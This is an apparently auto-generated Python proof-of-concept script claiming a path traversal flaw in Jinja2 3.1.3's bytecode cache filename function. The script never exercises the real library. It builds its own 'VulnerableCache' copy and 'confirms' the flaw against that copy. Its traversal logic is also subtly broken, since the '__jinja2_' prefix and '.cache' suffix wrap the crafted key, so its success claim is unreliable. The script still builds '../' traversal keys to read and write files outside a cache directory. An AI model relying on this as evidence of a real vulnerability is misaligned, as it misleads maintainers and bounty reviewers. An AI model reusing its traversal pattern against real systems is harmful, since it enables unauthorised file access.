#!/usr/bin/env python3
# PoC for Jinja2-3.1.3 (/tmp/bounty_test/Jinja2-3.1.3)
# Path: suspicious-010
# Sink: _get_cache_filename
# Auto-generated — run with: python3 lfi_function_constructs_using_os__get_cache_filename.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Jinja2-3.1.3 Path Traversal (LFI)
Vulnerability: _get_cache_filename uses os.path.join with attacker-controlled
template name (bucket.key) without sanitization, allowing path traversal.
"""

import os
import sys
import tempfile
import shutil
import argparse
from pathlib import Path

# Simulate the vulnerable Jinja2 cache component
class VulnerableBucket:
    """Simulates the bucket object with attacker-controlled key"""
    def __init__(self, key):
        self.key = key

class VulnerableCache:
    """
    Simulates the vulnerable Jinja2 BytecodeCache with path traversal issue.
    Based on the actual _get_cache_filename implementation.
    """
    def __init__(self, directory, pattern="__jinja2_%s.cache"):
        self.directory = directory
        self.pattern = pattern
    
    def _get_cache_filename(self, bucket):
        """Vulnerable method - no sanitization of bucket.key"""
        return os.path.join(self.directory, self.pattern % (bucket.key,))
    
    def write_cache(self, bucket, data):
        """Write data to cache file (simulates cache write)"""
        filename = self._get_cache_filename(bucket)
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, 'w') as f:
            f.write(data)
        print(f"[+] Written to: {filename}")
        return filename
    
    def read_cache(self, bucket):
        """Read data from cache file (simulates cache read)"""
        filename = self._get_cache_filename(bucket)
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                return f.read()
        return None

def demonstrate_lfi_write(target_dir, payload_file, payload_content):
    """
    Demonstrates LFI by writing a file outside the cache directory
    using path traversal in the template name.
    """
    print(f"[*] Target cache directory: {target_dir}")
    print(f"[*] Attempting to write to: {payload_file}")
    
    # Create the vulnerable cache instance
    cache = VulnerableCache(directory=target_dir)
    
    # Craft path traversal payload
    # Calculate how many '../' needed to escape to root
    relative_path = os.path.relpath(payload_file, target_dir)
    traversal_depth = len(Path(target_dir).parts)
    traversal = '../' * traversal_depth
    
    # The bucket.key becomes the template name (attacker-controlled)
    malicious_key = f"{traversal}{payload_file.lstrip('/')}"
    
    # Create bucket with malicious key
    bucket = VulnerableBucket(malicious_key)
    
    print(f"[*] Malicious bucket key: {malicious_key}")
    print(f"[*] Resulting path would be: {cache._get_cache_filename(bucket)}")
    
    # Perform the write operation
    try:
        written_path = cache.write_cache(bucket, payload_content)
        print(f"[+] Successfully wrote payload to: {written_path}")
        
        # Verify the file was created
        if os.path.exists(payload_file):
            with open(payload_file, 'r') as f:
                content = f.read()
            print(f"[+] Verified content: {content}")
            return True
        else:
            print(f"[-] File not found at expected location: {payload_file}")
            return False
    except Exception as e:
        print(f"[-] Error during write: {e}")
        return False

def demonstrate_lfi_read(target_dir, target_file):
    """
    Demonstrates LFI by reading a file outside the cache directory
    using path traversal in the template name.
    """
    print(f"[*] Target cache directory: {target_dir}")
    print(f"[*] Attempting to read: {target_file}")
    
    # Create the vulnerable cache instance
    cache = VulnerableCache(directory=target_dir)
    
    # Craft path traversal payload
    relative_path = os.path.relpath(target_file, target_dir)
    traversal_depth = len(Path(target_dir).parts)
    traversal = '../' * traversal_depth
    
    # The bucket.key becomes the template name (attacker-controlled)
    malicious_key = f"{traversal}{target_file.lstrip('/')}"
    
    # Create bucket with malicious key
    bucket = VulnerableBucket(malicious_key)
    
    print(f"[*] Malicious bucket key: {malicious_key}")
    print(f"[*] Resulting path would be: {cache._get_cache_filename(bucket)}")
    
    # Perform the read operation
    try:
        content = cache.read_cache(bucket)
        if content is not None:
            print(f"[+] Successfully read file content:")
            print(content)
            return True
        else:
            print(f"[-] File not found or empty")
            return False
    except Exception as e:
        print(f"[-] Error during read: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for Jinja2-3.1.3 Path Traversal (LFI)"
    )
    parser.add_argument(
        "--action", choices=["write", "read", "both"],
        default="both",
        help="Action to perform (default: both)"
    )
    parser.add_argument(
        "--target-dir", default="/tmp/jinja2_cache_poc",
        help="Simulated cache directory (default: /tmp/jinja2_cache_poc)"
    )
    parser.add_argument(
        "--payload-file", default="/tmp/poc_success.txt",
        help="File to write/read outside cache (default: /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--payload-content", default="PWNED: Jinja2-3.1.3 Path Traversal",
        help="Content to write (default: 'PWNED: Jinja2-3.1.3 Path Traversal')"
    )
    
    args = parser.parse_args()
    
    # Create a temporary cache directory for demonstration
    cache_dir = args.target_dir
    os.makedirs(cache_dir, exist_ok=True)
    
    print("=" * 60)
    print("Jinja2-3.1.3 Path Traversal (LFI) Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Cache directory: {cache_dir}")
    print(f"[*] Target file: {args.payload_file}")
    print()
    
    success = False
    
    if args.action in ("write", "both"):
        print("[*] Testing LFI WRITE...")
        print("-" * 40)
        success = demonstrate_lfi_write(
            cache_dir, args.payload_file, args.payload_content
        ) or success
        print()
    
    if args.action in ("read", "both"):
        print("[*] Testing LFI READ...")
        print("-" * 40)
        success = demonstrate_lfi_read(
            cache_dir, args.payload_file
        ) or success
        print()
    
    # Cleanup
    print("[*] Cleaning up...")
    if os.path.exists(cache_dir):
        shutil.rmtree(cache_dir)
    if os.path.exists(args.payload_file):
        os.remove(args.payload_file)
        print(f"[+] Removed: {args.payload_file}")
    
    print()
    if success:
        print("[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!")
        sys.exit(0)
    else:
        print("[-] Exploit failed - vulnerability not confirmed")
        sys.exit(1)

if __name__ == "__main__":
    main()
